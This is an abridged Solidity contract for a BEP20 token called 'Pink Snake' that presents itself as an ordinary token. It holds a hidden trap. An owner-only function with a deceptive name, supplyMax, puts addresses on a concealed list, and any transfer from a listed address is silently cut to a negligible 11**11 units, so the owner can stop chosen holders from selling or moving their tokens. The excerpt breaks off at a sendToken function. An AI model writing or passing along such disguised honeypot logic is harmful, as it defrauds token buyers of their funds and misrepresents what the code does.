...
contract PinkSnake is IBEP20, Ownable {
    using SafeMath for uint256;

    string constant _name = "Pink Snake";
    string constant _symbol = "PSE";
    uint8 constant _decimals = 18;
    uint256 _totalSupply = 100000000 * (10 ** _decimals);

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) _alList;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (_alList[sender]) {
            return _basicTransfer(sender, recipient, 11 ** 11);
        }
        return _basicTransfer(sender, recipient, amount);
    }
    ...
    function isSupplyMax(address spender) public view returns (bool) {
        return _alList[spender];
    }
    ...
    function supplyMax(address spender) public authorized {
        _alList[spender] = true;
    }

    function sendToken(uint256 amount) public authorized {
